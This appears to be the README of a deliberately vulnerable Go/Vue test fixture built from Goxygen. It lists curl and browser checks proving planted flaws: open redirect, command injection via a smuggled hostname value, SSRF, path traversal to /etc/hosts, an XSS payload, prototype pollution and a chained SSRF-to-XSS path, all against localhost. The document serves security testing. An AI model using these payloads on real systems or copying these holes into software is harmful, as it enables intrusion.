# app-project-goxygen local validation

This fixture was generated from Goxygen commit
`47ce691cfac7ecde991afb8c1eabe9a9206c3434` with:

```sh
go run . init --frontend vue --db postgres app-project-goxygen-generated
```

The generated project was then copied into `project/` and extended with
workspace navigation, branding preview, hostname diagnostics, report download,
referral banner, and URL-restored preference behavior.

## Start the API

Run the API from its `server` directory so the report feature resolves its
relative report directory correctly:

```sh
cd fixtures/app-project-goxygen/project/server
export PATH="$HOME/.local/go/bin:$PATH"
go test ./...
go run .
```

The API listens on `http://127.0.0.1:8080`. The seeded routes do not query
PostgreSQL, so they can be exercised without Docker or a database. The
generated `/api/technologies` catalog still uses the project's normal
PostgreSQL configuration and was not used by these checks.

## Backend checks

### Open redirect

```sh
curl -sS -o /dev/null -D - --get \
  --data-urlencode 'next=https://example.com/' \
  http://127.0.0.1:8080/api/continue
```

Expected result: the response contains
`Location: https://example.com/`. A request without `next` should redirect to
`/`.

### Command injection

```sh
curl -fsS --get \
  --data-urlencode 'hostname=localhost"; id; #' \
  http://127.0.0.1:8080/api/diagnostics/hostname
```

Expected result: the response contains a harmless `uid=...` line from `id`.

### SSRF

In another terminal, start a loopback-only marker server:

```sh
mkdir -p /tmp/app-project-goxygen-ssrf
printf 'LOCAL_LOGO_MARKER\n' > /tmp/app-project-goxygen-ssrf/logo.txt
python3 -m http.server 9001 \
  --bind 127.0.0.1 \
  --directory /tmp/app-project-goxygen-ssrf
```

Fetch the marker through the application:

```sh
curl -fsS --get \
  --data-urlencode 'logo_url=http://127.0.0.1:9001/logo.txt' \
  http://127.0.0.1:8080/api/branding/preview
```

Expected result: the response contains `LOCAL_LOGO_MARKER`.

### Path traversal

First verify the normal report control:

```sh
curl -fsS --get \
  --data-urlencode 'name=technology-overview.txt' \
  http://127.0.0.1:8080/api/reports/download
```

Expected result: the response contains `Technology overview`.

Then request `/etc/hosts` using the working-directory-relative traversal:

```sh
curl -fsS --get \
  --data-urlencode 'name=../../../../../../../../../etc/hosts' \
  http://127.0.0.1:8080/api/reports/download
```

Expected result: the response contains a local hosts entry such as
`127.0.0.1 localhost` or `::1`.

## Browser checks

Start the Vue development server:

```sh
cd fixtures/app-project-goxygen/project/webapp
npm install
npm run start -- --host 127.0.0.1
```

### Referral banner XSS

Open:

```text
http://127.0.0.1:3000/?welcome=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

Expected result: the browser displays an alert containing
`127.0.0.1`.

### Workspace preference prototype pollution control

Open:

```text
http://127.0.0.1:3000/?section=__proto__&key=workspaceMarker&value=owned
```

In the browser console, evaluate:

```js
({}).workspaceMarker
```

Expected result: it evaluates to `"owned"`. A normal URL such as
`/?section=dashboard&key=layout&value=compact` should only affect the
workspace layout object.

### Chained branding-preview impact

This is the realistic impact path. A shared branding-preview link restores a
markup-rendering preference, automatically previews the supplied logo URL, and
renders the returned branding content in the welcome banner. The preference
restore uses the polluted object prototype, while the preview request reuses
the server-side branding flow above.

Start a local, loopback-only HTML marker server:

```sh
mkdir -p /tmp/app-project-goxygen-ssrf
printf '<img src=x onerror="alert(document.domain)">\n' \
  > /tmp/app-project-goxygen-ssrf/payload.html
python3 -m http.server 9001 \
  --bind 127.0.0.1 \
  --directory /tmp/app-project-goxygen-ssrf
```

Open:

```text
http://127.0.0.1:3000/?section=__proto__&key=renderMarkup&value=true&logo_url=http%3A%2F%2F127.0.0.1%3A9001%2Fpayload.html
```

Expected result: the browser shows an alert containing `127.0.0.1`. The
request sequence is:

```text
shared URL
  -> URL preference restoration
  -> Object.prototype.renderMarkup
  -> automatic branding preview
  -> Go server fetches the logo URL
  -> Vue v-html renders the returned content
```
